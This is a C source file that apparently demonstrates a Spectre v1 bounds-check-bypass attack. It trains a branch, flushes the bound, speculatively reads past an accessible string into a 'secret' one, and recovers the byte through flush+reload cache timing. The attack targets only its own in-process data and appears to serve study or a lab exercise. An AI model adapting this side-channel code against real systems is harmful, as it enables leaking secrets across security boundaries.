#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"

void print_arr(int* results) {
    for(int i = 0; i < N_PAGES; i++) printf("%d, ", results[i]); printf("\n");

    printf("chars: ");
    for(int i = 0; i < N_PAGES; i++) {
        if(results[i] < 100) printf("'%c' (%d)\t", i, i);
    }
    printf("time for 1st secret char (t): %d\n", results[116]);
}

char* ACCESSIBLE    = "notsecretthis is a secret message";
char* SECRET;

int ACCESSIBLE_SIZE = 9;
int SECRET_SIZE     = 25;

int COMBINED_SIZE;

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    //flush bound value
    flush((void*)&ACCESSIBLE_SIZE);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < ACCESSIBLE_SIZE) {
        int x = ACCESSIBLE[i];
        volatile cp_t cp = arr[x];
    }
}
int* get_byte(int index) {

    cp_t *arr = mmap_arr_cache_pages();
    flush_arr(arr);
    __sync_synchronize();

    for(int i = 0; i < ACCESSIBLE_SIZE; i++) {
        victim_func(i, arr);
    }

    __sync_synchronize();
    flush_arr(arr);
    __sync_synchronize();
    victim_func(index, arr);

    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

int main(int argc, char* argv[]) {
    COMBINED_SIZE = ACCESSIBLE_SIZE + SECRET_SIZE;
    SECRET = ACCESSIBLE + ACCESSIBLE_SIZE;
    for(int i = 0; i < COMBINED_SIZE; i++) printf("%c", ACCESSIBLE[i]); printf("\n");

    int getting_byte = ACCESSIBLE_SIZE; //is 't'
    printf("getting ACCESSIBLE[%i] = '%c'\n", getting_byte, ACCESSIBLE[getting_byte]);
    int* results = get_byte(getting_byte);
    print_arr(results);

    free(results);
}